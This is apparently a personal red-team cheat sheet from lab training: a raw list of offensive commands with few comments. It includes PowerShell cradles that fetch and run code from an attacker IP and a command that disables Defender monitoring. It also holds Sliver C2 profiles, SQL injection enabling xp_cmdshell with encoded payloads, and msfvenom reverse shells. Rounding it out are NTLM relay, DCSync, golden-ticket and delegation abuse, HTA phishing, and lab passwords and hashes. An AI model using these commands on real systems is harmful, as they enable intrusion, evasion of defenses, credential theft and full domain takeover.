(When we set an intention, the world seems to magically come to meet us)

(New-Object System.Net.WebClient).DownloadString('http://192.168.45.181:80/am.txt') | IEX
powershell -ExecutionPolicy Bypass -Command "[scriptblock]::Create((Invoke-WebRequest "http://192.168.45.181:80/am.txt").Content).Invoke();"
execute C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
xfreerdp /v:192.168.214.100 /u:administrator /p:lab /clipboard /drive:share,/home/kali/

sliver:
	get certs:
	use auxiliary/gather/impersonate_ssl
	set RHOST www.google.com
	run

profiles new -b https://192.168.45.249:443,http://192.168.45.249:443?driver=wininet --format shellcode --arch amd64 osep
profiles new -g 192.168.45.181 --format service psexec
profiles new -g 192.168.45.181:443 --format shared --arch amd64 dll

stage-listener --url http://192.168.45.181:8082 --profile dll
stage-listener --url http://192.168.45.249:8080 --profile osep -C deflate9 --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV
https -L 192.168.45.249 -l 443 -c /home/kali/crt.crt -k /home/kali/key.key
wg-socks start

c2tc-lapsdump *
runas -d workstation1 -u administrator -P ,74Y)asdsjO6%t& -p cmd.exe -a '/c c:\users\rose\desktop\templantex.exe'

Get-DomainComputer -Unconstrained
dir \\dc11\pipe\spoolss
rubeus --in-process -t 15 monitor /interval:5 /nowrap
.\SpoolSample.exe 192.168.111.122(dc target) 192.168.111.111 (delegator)
lsadump::dcsync /domain:super.com /user:super\peep
^ (can also do golden ticket)

net localgroup administrators super\peep /add

powershell encoding:
pwsh
$command = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.181:80/am.txt') | IEX"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
$encodedCommand

sql injection:
a'; EXECUTE sp_configure 'show advanced options', 1;-- 
a'; RECONFIGURE;-- 
a'; EXECUTE sp_configure 'xp_cmdshell', 1;-- 
a'; RECONFIGURE;-- 
a'; EXEC xp_cmdshell 'powershell -encodedcommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAxADoAOAAwAC8AYQBtAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='-- 

sql:
sqlrecon /auth:wintoken /h:sql00 /module:smb /rhost:\\\\192.168.45.244\\somewhere
sudo proxychains impacket-ntlmrelayx --no-http-server -smb2support -t sql00 -c 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAxADoAOAAwAC8AYQBtAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
EXEC master.dbo.sp_addlinkedserver @server = N'SQL00'
EXEC sp_serveroption 'SQL00', 'rpc out', 'true';
EXECUTE ('EXEC master..xp_dirtree "\\192.168.45.181\test";') AT SQL00
EXECUTE ('EXECUTE sp_configure "show advanced options", 1; reconfigure;') AT SQL00
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT SQL00
EXEC ('xp_cmdshell ''powershell -encodedcommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAxADoAOAAwAC8AYQBtAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA==''') AT SQL03

feroxbuster -u http://192.168.100.100/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -n -E -x php html -s 200 301 302 -g -B -k

msfvenom payloads:
msfvenom --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.45.181 LPORT=443 -e x64/xor_dynamic -i 8 -b "\x00" prependfork=true -t 300 -f elf -e x64/xor_dynamic -o myfile.elf
msfvenom --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.45.197 LPORT=443 -e x64/xor_dynamic -i 8 -b "\x00" prependfork=true -t 300 -f elf -o myfile.elf
python3 -c 'import pty; pty.spawn("/bin/bash")'

ansible:
ansible2john credentials.vault > credentials.hash
haschat hash.hash wordlist --show
cat pw.txt | ansible-vault decrypt
$ANSIBLE_VAULT;1.1;AES256
3936363161393632623538323261663961
373662616635636332396436653365663331323032
366234356236383736366262573

swaks --body 'http://192.168.45.223/pizza.hta' --add-header "Really: 1.0" --add-header "Content-Type: text/html" --header "Subject: Important" -t deer@pip.com -f fry@fries.com --server 192.168.133.133

sudo docker compose --env-file .env up

export KRB5CCNAME=./Administrator.ccache

powerview:
Add-DomainObjectAcl -TargetIdentity admins -principalidentity svcadmin -Rights All
add-domaingroupmember -identity admins -members svcadmin
get-domainSID
Get-DomainGroup -Domain computer.com -Identity "Enterprise Admins" | select distinguishedname,objectsid
get-domaintrust

env | grep KRB5CCNAME
kinit
klist
ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName
kvno MSSQLSvc/DC01.corp1.com:1433
ktutil
addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac
wkt /tmp/administrator.keytab
quit
kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
kinit -R <- renew
smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
sudo proxychains crackmapexec smb 172.16.245.0/24 -u 'peep@COMputer.COM' -k
~!!! you sometimes have to manually go on target, specify hostname!!!~

impacket-psexec -k -no-pass 'computer.com/peep'@dmzdc.computer.com
lsadump::dcsync /user:krbtgt
lsadump::lsa /inject /name:krbtgt
get-domainSID
Get-DomainGroup -Domain comply.com -Identity "Enterprise Admins" | select distinguishedname,objectsid
get-domaintrust
Get-DomainTrust -Domain corp1.com
Get-DomainTrustMapping
Get-DomainUser -Domain corp2.com
Get-DomainForeignGroupMember -Domain corp2.com
convertfrom-sid S-1-5-21-3776646582-2086779273-4091361643-1601

domain forest bidirectional trust
kerberos::golden /user:administrator /domain:oper.computer.com /sid:S-1-5-21-2032401531-514583578-4118054891 /krbtgt:7c7865e6e30e54e8845aad091b0ff447 /sids:S-1-5-21-1135011135-3178090508-3151492220-519 /ptt (or /export)
.\Rubeus.exe ptt /ticket:ticket.kirbi

generice write:
$ComputerSid = Get-DomainComputer FILESERV -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer JUMPSERV | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer JUMPSERV -Properties 'msds-allowedtoactonbehalfofotheridentity'
	output: 
	msds-allowedtoactonbehalfofotheridentity
	----------------------------------------
	{1, 0, 4, 128...}
	
#generic write
rubeus s4u /user:FILESERV /rc4:257df2a015598f648885526f56473014 /impersonateuser:administrator /msdsspn:cifs/FILESERV.oper.computer.com /domain:oper.computer.com /ptt (/nowrap)
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
rubeus -- asktgt /user:FILESERV$ /ntlm:4d5be97087535f3ba9c3a2d4d6524c3e /nowrap

rubeus --in-process s4u /impersonateuser:administrator /domain:jumpserv.oper.computer.com /msdsspn:cifs/JUMPSERV.OPER.COMPUTER.COM /ticket:doIE9DCCBPC /ptt /dc:172.16.244.144

generice write/write-all from computer account:
proxychains impacket-rbcd -action write -delegate-to "JUMPSERV$" -delegate-from "FILESERV$" oper.computer.com/fileserv\$ -hashes :4d5be97087535f3ba9c3a2d4d6524c3e -dc-ip 172.16.244.111

.\rubeus.exe s4u /impersonateuser:administrator /msdsspn:cifs/JUMPSERV.OPER.COMPUTER.COM /user:FILESERV$ /ticket:doIE9DCCBPCgAwIBt /nowrap
./rubeustoccache.py 'doIGGjC
proxychains impacket-psexec -k -target-ip 172.16.221.221 -dc-ip 172.16.221.222  jumpserv.oper.computer.com

proxychains impacket-getST -spn cifs/jumpserv.oper.computer.com oper.computer.com/fileserv\$ -impersonate Administrator -dc-ip 172.16.221.221 -hashes :4d5be97087535f3ba9c3a2d4d6524c3e

export KRB5CCNAME=./Administrator.ccache

Rubeus.exe asktgt /domain:test.local /user:john /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt

lsadump::lsa /inject /name:krbtgt
lsadump::dcsync /domain:prod.corp1.com /user:corp1$
lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
Get-DomainSID -Domain prod.corp1.com
Get-DomainSid -Domain ops.comply.com
Get-DomainGroup -Domain computer.com -Identity "Enterprise Admins" | select distinguishedname,objectsid
kerberos::golden /user:oran /domain:oper.computer.com /sid:S-1-5-21-2032401531-514583578-4118054891 /krbtgt:7c7865e6e30e54e8845aad091b0ff447 /sids:S-1-5-21-1135011135-3178090508-3151492220-519 /ptt

try psexec from internal linux host. OR try adding enterprise admin
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
New-DomainUser -SamAccountName harmj0y2 -Description 'This is harmj0y' -AccountPassword $UserPassword -domain comply.com
Add-DomainGroupMember -Identity 'Enterprise Admins' -Members 'harmj0y2' -domain comply

powerup:
Invoke-PrivescAudit
(might have to modify service to start as system and interact with desktop)

proxychains crackmapexec ssh 172.16.111.0/24 -u tums@fixing.com -p '89asfsjasdfA'

resolve dc dns: systemd-resolve --status | grep "DNS Servers"
resolve ip to host: nmblookup -A 172.16.242.242

SCShell.exe 192.168.197.131 XblAuthManager "C:\windows\system32\cmd.exe /c C:\windows\system32\regsvr32.exe /s /n /u /i://your.website/payload.sct scrobj.dll" . administrastor Password
sc \\PC1 create pentestlab binpath= "C:\Windows\System32\regsvr32.exe /s /n /u /i:http://10.0.0.21:8080/pentestlab.sct scrobj.dll"
sc \\PC1 start pentestlab

rubeus --in-process asktgs /service:MSSQLSvc/sql00.tacks.com:1433 /ticket:tgt /nowrap
rubeus kerberoast
impacket-mssqlclient tim@sql00.tacks.com -k -no-pass
master..xp_dirtree "\\192.168.45.181\test"

look for basics, cred re-use, admin hash re-use, back to the basics sometimes
